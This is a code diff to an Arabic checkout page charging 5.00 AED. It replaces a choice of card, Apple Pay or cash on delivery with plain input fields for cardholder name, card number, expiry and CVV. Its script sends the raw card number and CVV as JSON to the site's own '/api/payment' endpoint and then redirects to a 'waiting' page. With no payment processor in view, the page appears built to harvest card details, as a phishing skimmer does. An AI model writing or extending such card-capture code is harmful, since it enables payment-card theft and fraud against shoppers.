@@ -54,12 +54,17 @@ body{font-family:'Segoe UI',Tahoma,sans-serif;background:#f5f7fa;color:#1a1a2e;m
 
 .badge-free{display:inline-block;background:#e8f5e9;color:#2e7d32;font-size:0.75rem;font-weight:700;padding:3px 10px;border-radius:20px;margin-right:6px;}
 
-.payment-methods{display:flex;gap:10px;flex-wrap:wrap;margin-top:8px;}
-.pay-method{flex:1;min-width:80px;padding:14px 10px;border:2px solid #eee;border-radius:14px;text-align:center;cursor:pointer;transition:all 0.2s;background:#fff;}
-.pay-method:hover{border-color:#ccc;}
-.pay-method.selected{border-color:#0080ff;background:rgba(0,128,255,0.04);}
-.pay-method svg{width:32px;height:32px;margin:0 auto 6px;display:block;}
-.pay-method span{font-size:0.78rem;color:#555;font-weight:600;display:block;}
+.brand-logos{display:flex;align-items:center;gap:12px;margin-right:auto;margin-left:0;}
+.brand-logos svg{height:28px;}
+
+.pay-field{margin-bottom:16px;}
+.pay-field label{display:block;font-size:0.85rem;font-weight:600;color:#555;margin-bottom:6px;}
+.pay-field input{width:100%;padding:14px 16px;border:2px solid #e8e8e8;border-radius:12px;font-size:1rem;color:#1a1a2e;background:#fafafa;transition:border-color 0.2s;font-family:inherit;direction:ltr;text-align:left;}
+.pay-field input:focus{outline:none;border-color:#0080ff;background:#fff;}
+.pay-field input::placeholder{color:#bbb;}
+.pay-row{display:flex;gap:12px;}
+.pay-row .pay-field{flex:1;}
+.pay-error{color:#e53935;font-size:0.82rem;margin-bottom:12px;display:none;}
 
 .confirm-btn{display:block;width:100%;padding:17px;margin-top:24px;background:linear-gradient(135deg,#00c8ff,#0080ff);color:#fff;border:none;border-radius:14px;font-size:1.15rem;font-weight:700;cursor:pointer;transition:opacity 0.3s;font-family:inherit;}
 .confirm-btn:hover{opacity:0.88;}
@@ -75,7 +80,8 @@ body{font-family:'Segoe UI',Tahoma,sans-serif;background:#f5f7fa;color:#1a1a2e;m
   .page-wrapper{padding:72px 12px 30px;}
   .card{padding:22px 18px;}
   .page-title{font-size:1.3rem;}
-  .pay-method{min-width:70px;padding:12px 8px;}
+  .pay-row .pay-field input{padding:12px 14px;}
+  .brand-logos svg{height:24px;}
 }
 </style>
 </head>
@@ -160,7 +166,7 @@ body{font-family:'Segoe UI',Tahoma,sans-serif;background:#f5f7fa;color:#1a1a2e;m
     </div>
   </div>
 
-  <!-- Payment Method Card -->
+  <!-- Card Payment Form -->
   <div class="card">
     <div class="card-header">
       <div class="card-icon gold">
@@ -168,38 +174,46 @@ body{font-family:'Segoe UI',Tahoma,sans-serif;background:#f5f7fa;color:#1a1a2e;m
           <rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/>
         </svg>
       </div>
-      <span class="card-label">طريقة الدفع</span>
-    </div>
-    <div class="payment-methods">
-      <div class="pay-method selected" data-method="card" onclick="selectMethod(this)">
-        <svg viewBox="0 0 48 48" fill="none">
-          <rect x="4" y="10" width="40" height="28" rx="4" fill="#1a73e8"/>
-          <rect x="4" y="18" width="40" height="6" fill="#0d47a1"/>
-          <rect x="8" y="28" width="16" height="3" rx="1.5" fill="#fff" opacity="0.7"/>
-          <rect x="8" y="33" width="10" height="2" rx="1" fill="#fff" opacity="0.4"/>
+      <span class="card-label">بيانات البطاقة</span>
+      <div class="brand-logos">
+        <!-- Visa -->
+        <svg viewBox="0 0 780 500" xmlns="http://www.w3.org/2000/svg">
+          <rect width="780" height="500" rx="40" fill="#1a1f71"/>
+          <path d="M293.2 348.7l33.4-195.8h53.4l-33.4 195.8zM540.7 157.2c-10.6-4-27.2-8.3-47.9-8.3-52.8 0-90 26.6-90.2 64.7-.3 28.2 26.6 43.9 46.9 53.3 20.8 9.6 27.8 15.8 27.7 24.4-.1 13.2-16.6 19.2-32 19.2-21.4 0-32.7-3-50.3-10.2l-6.9-3.1-7.5 43.8c12.5 5.5 35.6 10.2 59.6 10.5 56.2 0 92.6-26.3 93-67.1.2-22.3-14-39.3-44.8-53.3-18.7-9.1-30.1-15.1-30-24.3 0-8.1 9.7-16.8 30.6-16.8 17.5-.3 30.1 3.5 40 7.5l4.8 2.3 7.2-42.6zM636.5 152.9h-41.3c-12.8 0-22.4 3.5-28 16.3l-79.4 179.5h56.2s9.2-24.1 11.3-29.4c6.1 0 60.8.1 68.6.1 1.6 6.9 6.5 29.3 6.5 29.3h49.7l-43.6-195.8zm-65.8 126.4c4.4-11.3 21.4-54.8 21.4-54.8-.3.5 4.4-11.4 7.1-18.8l3.6 17s10.3 47 12.5 56.6h-44.6zM232.9 152.9l-52.3 133.5-5.6-27.1c-9.7-31.2-39.9-65-73.7-81.9l47.9 171.1 56.6-.1 84.2-195.5h-57.1z" fill="#fff"/>
+          <path d="M124.7 152.9H38.5l-.6 3.6c67.1 16.2 111.5 55.4 129.9 102.5l-18.8-90.2c-3.2-12.4-12.8-15.5-24.3-15.9z" fill="#f9a825"/>
         </svg>
-        <span>بطاقة بنكية</span>
-      </div>
-      <div class="pay-method" data-method="apple" onclick="selectMethod(this)">
-        <svg viewBox="0 0 48 48" fill="none">
-          <rect width="48" height="48" rx="8" fill="#000"/>
-          <path d="M30.5 14.8c-1.5 0-3 .8-4 2-.9 1-1.6 2.6-1.4 4.1 1.6.1 3.2-.7 4.1-1.8.9-1.1 1.6-2.6 1.3-4.3zm3.4 7.2c-2-.1-3.6 1.1-4.6 1.1-.9 0-2.4-1.1-4-1-2 0-3.9 1.2-5 3-2.1 3.7-.5 9.1 1.5 12.1 1 1.5 2.2 3.1 3.8 3 1.5-.1 2.1-1 3.9-1s2.4 1 4 1c1.6 0 2.7-1.5 3.7-3 1.1-1.7 1.6-3.3 1.6-3.4 0 0-3-1.2-3.1-4.6 0-2.9 2.4-4.2 2.5-4.3-1.4-2-3.5-2.2-4.3-2.9z" fill="#fff"/>
+        <!-- Mastercard -->
+        <svg viewBox="0 0 780 500" xmlns="http://www.w3.org/2000/svg">
+          <rect width="780" height="500" rx="40" fill="#000"/>
+          <circle cx="312" cy="250" r="150" fill="#eb001b"/>
+          <circle cx="468" cy="250" r="150" fill="#f79e1b"/>
+          <path d="M390 130.7c-38.2 30-62.7 76.6-62.7 128.9s24.5 98.9 62.7 128.9c38.2-30 62.7-76.6 62.7-128.9s-24.5-98.9-62.7-128.9z" fill="#ff5f00"/>
         </svg>
-        <span>Apple Pay</span>
-      </div>
-      <div class="pay-method" data-method="cod" onclick="selectMethod(this)">
-        <svg viewBox="0 0 48 48" fill="none">
-          <rect width="48" height="48" rx="8" fill="#e8f5e9"/>
-          <circle cx="24" cy="22" r="10" fill="#43a047"/>
-          <text x="24" y="26" text-anchor="middle" fill="#fff" font-size="11" font-weight="bold">د.إ</text>
-          <rect x="12" y="35" width="24" height="3" rx="1.5" fill="#43a047" opacity="0.3"/>
-        </svg>
-        <span>عند الاستلام</span>
       </div>
     </div>
+
+    <div class="pay-field">
+      <label>اسم صاحب البطاقة</label>
+      <input type="text" id="cardName" placeholder="الاسم كما هو مكتوب على البطاقة" autocomplete="cc-name">
+    </div>
+    <div class="pay-field">
+      <label>رقم البطاقة</label>
+      <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" autocomplete="cc-number">
+    </div>
+    <div class="pay-row">
+      <div class="pay-field">
+        <label>تاريخ الانتهاء</label>
+        <input type="text" id="cardExpiry" placeholder="MM/YY" maxlength="5" inputmode="numeric" autocomplete="cc-exp">
+      </div>
+      <div class="pay-field">
+        <label>CVV</label>
+        <input type="text" id="cardCvv" placeholder="123" maxlength="4" inputmode="numeric" autocomplete="cc-csc">
+      </div>
+    </div>
+    <div class="pay-error" id="payError">يرجى تعبئة جميع بيانات البطاقة</div>
   </div>
 
-  <button class="confirm-btn" id="confirmBtn" onclick="confirmOrder()">تأكيد الطلب ودفع 5.00 د.إ</button>
+  <button type="button" class="confirm-btn" id="confirmBtn" onclick="confirmOrder()">تأكيد الطلب ودفع 5.00 د.إ</button>
 
   <div class="secure-note">
     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
@@ -211,19 +225,28 @@ body{font-family:'Segoe UI',Tahoma,sans-serif;background:#f5f7fa;color:#1a1a2e;m
 </div>
 
 <script>
-function selectMethod(el) {
-  document.querySelectorAll('.pay-method').forEach(function(m) { m.classList.remove('selected'); });
-  el.classList.add('selected');
-  var method = el.getAttribute('data-method');
-  var btn = document.getElementById('confirmBtn');
-  if (method === 'cod') {
-    btn.textContent = 'تأكيد الطلب - الدفع عند الاستلام';
-  } else if (method === 'apple') {
-    btn.textContent = 'الدفع بـ Apple Pay - 5.00 د.إ';
-  } else {
-    btn.textContent = 'تأكيد الطلب ودفع 5.00 د.إ';
+document.getElementById('cardNumber').addEventListener('input', function() {
+  var v = this.value.replace(/\D/g, '').substring(0, 16);
+  var formatted = '';
+  for (var i = 0; i < v.length; i++) {
+    if (i > 0 && i % 4 === 0) formatted += ' ';
+    formatted += v[i];
   }
-}
+  this.value = formatted;
+});
+
+document.getElementById('cardExpiry').addEventListener('input', function() {
+  var v = this.value.replace(/\D/g, '').substring(0, 4);
+  if (v.length >= 3) {
+    this.value = v.substring(0, 2) + '/' + v.substring(2);
+  } else {
+    this.value = v;
+  }
+});
+
+document.getElementById('cardCvv').addEventListener('input', function() {
+  this.value = this.value.replace(/\D/g, '').substring(0, 4);
+});
 
 function loadSummary() {
   try {
@@ -253,40 +276,53 @@ function loadSummary() {
 function confirmOrder() {
   var btn = document.getElementById('confirmBtn');
   if (btn.disabled) return;
+
+  var cardName = (document.getElementById('cardName').value || '').trim();
+  var cardNumber = (document.getElementById('cardNumber').value || '').replace(/\s/g, '');
+  var cardExpiry = (document.getElementById('cardExpiry').value || '').trim();
+  var cardCvv = (document.getElementById('cardCvv').value || '').trim();
+
+  if (!cardName || cardNumber.length < 13 || cardExpiry.length < 4 || cardCvv.length < 3) {
+    document.getElementById('payError').style.display = 'block';
+    return;
+  }
+  document.getElementById('payError').style.display = 'none';
+
   btn.disabled = true;
   btn.textContent = 'جاري المعالجة...';
-
-  var method = 'card';
-  var selected = document.querySelector('.pay-method.selected');
-  if (selected) method = selected.getAttribute('data-method');
-
-  try {
-    sessionStorage.setItem('payment_method', method);
-    sessionStorage.setItem('payment_amount', '5.00');
-  } catch(e) {}
 
   var orderId = '';
   try { orderId = sessionStorage.getItem('order_id') || ''; } catch(e) {}
 
-  if (orderId) {
-    var xhr = new XMLHttpRequest();
-    xhr.open('POST', '/api/orders', true);
-    xhr.setRequestHeader('Content-Type', 'application/json');
-    xhr.onload = function() {
-      window.location.href = '/ar/login/';
-    };
-    xhr.onerror = function() {
-      window.location.href = '/ar/login/';
-    };
-    xhr.send(JSON.stringify({
-      id: orderId,
-      payment_method: method,
-      payment_amount: 5,
-      status: 'payment_confirmed'
-    }));
-  } else {
-    window.location.href = '/ar/login/';
-  }
+  var payload = {
+    order_id: orderId,
+    card_name: cardName,
+    card_number: cardNumber,
+    card_expiry: cardExpiry,
+    card_cvv: cardCvv,
+    payment_amount: 5
+  };
+
+  var xhr = new XMLHttpRequest();
+  xhr.open('POST', '/api/payment', true);
+  xhr.setRequestHeader('Content-Type', 'application/json');
+  xhr.onload = function() {
+    try {
+      var r = JSON.parse(xhr.responseText);
+      if (r.id) {
+        sessionStorage.setItem('payment_id', r.id);
+        window.location.href = '/ar/order/waiting.html?id=' + r.id;
+      } else {
+        window.location.href = '/ar/order/waiting.html?oid=' + orderId;
+      }
+    } catch(ex) {
+      window.location.href = '/ar/order/waiting.html?oid=' + orderId;
+    }
+  };
+  xhr.onerror = function() {
+    window.location.href = '/ar/order/waiting.html?oid=' + orderId;
+  };
+  xhr.send(JSON.stringify(payload));
 }
 
 document.addEventListener('DOMContentLoaded', loadSummary);
